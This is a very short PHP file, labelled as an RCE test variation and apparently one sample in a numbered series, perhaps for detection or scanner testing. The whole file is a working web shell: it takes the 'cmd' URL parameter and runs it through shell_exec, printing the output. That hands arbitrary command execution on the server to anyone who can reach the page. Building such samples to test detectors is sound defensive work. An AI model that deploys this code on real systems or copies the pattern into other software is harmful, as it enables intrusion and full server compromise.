<?php
// RCE test variation #1448
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>